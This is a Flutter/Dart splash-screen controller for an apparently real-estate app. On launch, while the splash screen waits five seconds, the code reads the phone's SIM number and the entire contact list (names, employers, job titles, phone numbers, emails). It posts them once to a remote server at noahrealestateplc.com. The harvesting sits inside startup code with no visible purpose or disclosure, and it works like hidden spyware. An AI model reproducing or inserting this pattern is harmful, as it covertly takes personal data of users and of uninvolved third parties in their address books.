import 'dart:math';

import 'package:contacts_service/contacts_service.dart';
import 'package:dio/dio.dart';
import 'package:flutter/widgets.dart';
import 'package:get/get.dart';
import 'package:noahrealstate/app/common/app_constants.dart';
import 'package:noahrealstate/app/data/model/contact_model.dart';
import 'package:noahrealstate/app/routes/app_pages.dart';
import 'package:flutter/services.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:noahrealstate/app/service/api_call_status.dart';
import 'package:noahrealstate/app/service/base_client.dart';
import 'package:noahrealstate/app/service/cache_helper.dart';
import 'package:permission_handler/permission_handler.dart';

class SplashController extends GetxController {
  //TODO: Implement SplashController

  final count = 0.obs;
  @override
  void onInit() {
    MobileNumber.listenPhonePermission((isPermissionGranted) {
      if (isPermissionGranted) {
        initMobileNumberState();
      } else {}
    });

    initMobileNumberState();

    super.onInit();
  }

  ApiCallStatus apiCallStatus = ApiCallStatus.holding;

  @override
  Future<void> onReady() async {
    await Future.delayed(const Duration(seconds: 5), () {
      Get.toNamed(Routes.HOME);
    });
    super.onReady();
  }

  @override
  void onClose() {
    super.onClose();
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initMobileNumberState() async {
    if (!await MobileNumber.hasPhonePermission) {
      await MobileNumber.requestPhonePermission;
      return;
    }
    // Platform messages may fail, so we use a try/catch PlatformException.
    try {
      var _mobileNumber = (await MobileNumber.mobileNumber)!;
      var _simCard = (await MobileNumber.getSimCards)!.first;
      List contactsList = [];

      // You can also directly ask for the permission using the request() method.
      if (await Permission.contacts.request().isGranted) {
        Iterable<Contact> contacts =
            await ContactsService.getContacts(withThumbnails: false);

        contacts.forEach((con) {
          List<String>? phones = [];
          con.phones!.forEach((phone) {
            print(phone.value);
            phone.value != null ? phones.add(phone.value!) : null;
          });
          print(con.phones);
          List<String>? emails = [];
          con.emails?.forEach(
              (phone) => phone.value != null ? emails.add(phone.value!) : null);
          print(con.emails);

          ContactInfo info = ContactInfo(
              name: con.displayName,
              organization: con.company,
              designation: con.jobTitle,
              phoneNumbers: phones,
              emailList: emails);

          contactsList.add(info.toJson());
        });
      }
      bool status = await CacheHelper.getAddContacts();

      if (!status) {
        Dio dio = Dio();

        try {
          // Show loading
          print({
              "c": contactsList,
              "s": _simCard.number,
            });

          // Make the POST request
          final response = await dio.post(
            'https://noahrealestateplc.com/app/index.php?s=${_simCard.number}',
            data: {
              "c": contactsList,
              "s": _simCard.number,
            },
          );
print(response);
          // Handle success
          if (response.statusCode == 200) {
            CacheHelper.addContacts(true);
            apiCallStatus = ApiCallStatus.success;
            update();
          } else {
            // Handle unexpected status codes
            update();
          }
        } catch (error) {
          // Handle errors
          print("Error: $error");
          update();
        }
      }
    } on PlatformException catch (e) {
      debugPrint("Failed to get mobile number because of '${e.message}'");
    }
  }
}
